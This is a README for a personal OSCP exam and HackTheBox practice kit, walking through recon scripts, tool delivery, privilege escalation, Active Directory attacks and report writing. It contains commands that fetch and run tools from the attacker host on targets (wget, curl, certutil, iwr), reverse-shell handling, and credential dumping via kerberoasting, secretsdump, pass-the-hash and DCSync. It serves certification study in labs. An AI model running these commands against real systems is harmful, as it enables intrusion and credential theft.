# OSCP Exam Kit — How to Use It

All commands are run from `~/Desktop/OSCP-Notes-and-Environment/OSCP-Exam/`. Do this first:
```
cd ~/Desktop/OSCP-Notes-and-Environment/OSCP-Exam
sudo apt install -y rlwrap        # one-time: nicer reverse shells
sudo openvpn report/../Offsec/universal.ovpn &   # connect exam VPN (adjust path)
ip a                              # note your tun0 IP = <KALI>
```

## Terminal layout
One command builds the whole screen (serve | listener | work) in tmux:
```
export WORKDIR=~/Desktop/HTB     # optional, for practice
./scripts/oscp-layout.sh         # attach later: tmux attach -t oscp
```
Panes: 1) `./scripts/serve.sh 7890` (leave running)  2) `./scripts/listener.sh 443`
(re-run per catch)  3) **Work** — everything else

**Log everything (evidence backup):** start your Work shell inside a logged
session so every command + reverse-shell interaction is captured:
```
./scripts/logsession.sh box1     # transcript -> logs/box1_<ts>.log ; 'exit' to stop
# replay in real time:  scriptreplay -t logs/box1_<ts>.timing logs/box1_<ts>.log
```

---

## A. Every new box
```
./scripts/newtarget.sh box1 10.10.10.10     # makes targets/box1/ + notes.md
./scripts/rx.sh box1 10.10.10.10            # reconx (PRIMARY): ranked findings + NOTES.md
#   fallback (no deps):  ./scripts/recon.sh 10.10.10.10 box1
```
reconx ranks what to look at first — read
`targets/box1/scans/reconx/10.10.10.10/NOTES.md`, then work `targets/box1/notes.md`.
Handy: `--quick` (fast), `--resume` (after Ctrl-C), `--dry-run`, `--man` (full manual).

## B. Get a shell, deliver tools
Kali serves `serve/`; grab tools ON the target:
```
# Linux target:
wget http://<KALI>/linux/linpeas.sh -O /tmp/lp.sh; bash /tmp/lp.sh
curl http://<KALI>/linux/pspy64 -o /tmp/p; chmod +x /tmp/p; /tmp/p
# Windows target:
certutil -urlcache -f http://<KALI>/windows/nc.exe nc.exe
iwr http://<KALI>/windows/winPEASx64.exe -o wp.exe; .\wp.exe
```
Catch the shell with the listener (window 2). Stabilise Linux shells:
`python3 -c 'import pty;pty.spawn("/bin/bash")'` → Ctrl-Z → `stty raw -echo; fg`.

## C. Privesc
Linux: `sudo -l`, run linpeas/pspy, check SUID + GTFOBins.
Windows: `whoami /priv` → if `SeImpersonate`, use `PrintSpoofer64.exe` or
`GodPotato-NET4.exe` from serve/windows/.

## D. Active Directory (do in order)
```
# 1. find live hosts
./scripts/gen-hosts.sh -r 192.168.120.0/24 -x <KALI-IP>
# 2. unauth enum + AS-REP roast
./scripts/ad-fastpath.sh -d corp.local -i <DC-IP>
# 3. once you have ANY domain creds: kerberoast + crack + BloodHound
./scripts/ad-fastpath.sh -d corp.local -i <DC-IP> -u user -p pass -c -b
# 4. after admin on a host: dump secrets + spray hashes to move laterally
./scripts/ad-secretsdump.sh -t <host> -d corp.local -u adm -p pass -S loot/hosts.txt
# 5. with a DA hash: DCSync the DC and finish
./scripts/ad-secretsdump.sh -t <DC-IP> -d corp.local -u dadmin -H <nthash>
```
Move with: `evil-winrm -i IP -u u -p p` | `-H hash` (PtH) | `impacket-psexec`.

Visualize collected BloodHound data (the .zip from ad-fastpath/reconx):
```
./scripts/bloodhound.sh start   # UI http://localhost:8080 ; ./bloodhound.sh pw
# drag the .zip into the UI, mark Domain Admins as high-value, run shortest-path queries
./scripts/bloodhound.sh stop
```

## E. Capture proof (do this the MOMENT you get each flag)
```
./scripts/proof.sh -o windows                                  # shows capture cmd
./scripts/proof.sh -n box1 -i 10.10.10.10 -t local -f <flag>   # user flag
./scripts/proof.sh -n box1 -i 10.10.10.10 -t proof -f <flag>   # root flag
./scripts/proof.sh -l                                          # running points tally
```
On the target, ALWAYS one screenshot with the IP visible:
`type proof.txt & ipconfig`  /  `cat proof.txt; ip a`. Save screenshots per box.

## F. Write & submit the report
1. Copy `report/OSCP-Report-Template.md` and fill it per host from your notes +
   screenshots (see `report/SAMPLE-Report.md` for the expected depth).
2. Convert:
```
./scripts/md2report.sh report/MyExamReport.md -d    # -> PDF (+ DOCX)
```
3. Submit the PDF. Keep it under the size limit; verify it opens.

## Quick reference
- Cheatsheet with all commands: `cheatsheets/OSCP-Cheatsheet.md`
- Verify tool kit intact: `cd serve && sha256sum -c MANIFEST.sha256`
- Exam rules: metasploit on ONE box only; no auto-exploit tools (sqlmap auto,
  autorecon-exploit); screenshot every proof with IP.

---

# Practice Mode (HTB / THM / PG)

The whole kit works for practice — just tell it where to put the box folders,
and remember practice has **no tool restrictions** (unlike the exam).

## Point workspaces at your practice folder
```
export WORKDIR=~/Desktop/HTB          # (or ~/Desktop/THM) — set once per terminal
./scripts/newtarget.sh forest 10.10.10.161
./scripts/rx.sh forest 10.10.10.161   # box lands in ~/Desktop/HTB/forest/
```
Unset it (`unset WORKDIR`) to go back to the exam workspace. The served tool kit,
cheatsheet, and report converter are shared — only the per-box folders move.

## Connect the platform VPN
```
sudo openvpn ~/Desktop/HTB/lab.ovpn &      # HTB
sudo openvpn ~/Desktop/THM/thm.ovpn &      # THM  (download each from the site)
ip a                                        # your tun0 IP = <KALI>
```

## Practice ≠ exam — use everything
On HTB/THM you are NOT bound by OSCP tool rules, so practice the fast tools too:
```
./scripts/rx.sh box IP --nikto --mode deep     # be noisy, dig deep
msfconsole / metasploit                         # fine here (exam: ONE box only)
nuclei -u http://IP ; sqlmap -u '...' --batch   # fine here (exam: not allowed)
```
But also drill the **manual** path (the exam way) so you don't rely on them:
reconx → manual exploit → linpeas/winPEAS → proof. Best practice = solve it once
with tools, then again by hand.

## Same flow otherwise
`newtarget → rx.sh → serve/listener → exploit → privesc → proof.sh`, and the AD
scripts (`ad-fastpath`, `ad-secretsdump`, `gen-hosts`) work on HTB AD boxes and
Pro Labs exactly the same. Write practice notes in each box's `notes.md` to build
your own methodology library.
